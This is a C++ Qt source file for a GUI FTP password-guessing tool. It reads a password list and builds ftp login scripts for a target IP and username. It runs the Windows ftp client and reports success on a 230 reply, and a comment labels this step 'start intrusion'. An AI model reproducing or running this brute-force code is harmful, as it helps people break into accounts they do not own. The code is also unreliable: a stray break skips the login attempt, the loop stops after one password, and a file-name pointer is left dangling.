#include "mainwindow.h"
#include "ui_mainwindow.h"

#include <QString>
#include <QFileDialog>
#include <QTextCodec>

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <QDebug>

FILE * fp = NULL;

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_actiontianjiawenjian_triggered()
{
    QString fileName = QFileDialog::getOpenFileName();
    QTextCodec * codec = QTextCodec::codecForName("GBK");
    char * file = codec->fromUnicode(fileName).data();
    //file = NULL;
    fp = fopen(file,"r");
    if(!fp) {
        ui->label_4->setText(codec->toUnicode("OPEN FILE ERROP!"));//label_4显示中文乱码
        return;
    }
    else ui->label_4->setText(codec->toUnicode("PASSWORD FILE INPUT SUCCESSFUL!"));
}

void MainWindow::on_pushButton_clicked()
{
    QTextCodec * codec = QTextCodec::codecForName("GBK");
    QString ip = ui->textEdit->toPlainText();
    QString user = ui->textEdit_2->toPlainText();
    if(!fp) {
        ui->label_4->setText(codec->toUnicode("PLEASE INPUT PASSWORD FILE!"));
        return;
    }
    if(ip.isEmpty()) {
        ui->label_4->setText(codec->toUnicode("PLEASE INPUT IP ADDRESS!"));
        return;
    }
    if(user.isEmpty()) {
        ui->label_4->setText(codec->toUnicode("PLEASE INPUT ADMIN!"));
        return;
    }

    char passwd[20]; // 存放每次读取的一个密码
    char buf[1024];// 用于组装密钥格式
    char content[1024];// 用于接收控制台内容
    while(1) {
        memset(passwd,0,20);
        memset(buf,0,1024);
        fgets(passwd,20,fp);

        /* 生成文件格式
         * open 192.168.137.135
         * user
         * zsgj
         * 000000
         * bye
         */

        sprintf(buf,"open %s\nuser\n%s\n%sbye",
                ip.toStdString().data(),
                user.toStdString().data(),
                passwd);

        //qDebug()<<buf;
        //break;
        FILE * fp1 = fopen("D:\\ftpmiyao.txt","w");
        if(!fp1) {
            ui->label_4->setText(codec->toUnicode("ERROR"));
        }
        fputs(buf,fp1);
        fclose(fp1);
        break;

        //开始入侵
        FILE * fp2 = _popen("ftp -n -s:D:\\ftpmiyao.txt","r");
        if(!fp2) {
            ui->label_4->setText(codec->toUnicode("ERROR"));
            return;
        }
        memset(content,0,1024);
        while(!feof(fp2)) {
            fgets(content,1024,fp2);
            qDebug()<<content;
        }
        if(!strncmp("230",content,3)) {
            ui->label_4->setText(codec->toUnicode("GOOG JOB"));
            ui->label_3->setText(codec->toUnicode(passwd));
            exit(0);
        }
        _pclose(fp2);
        break;
    }
}
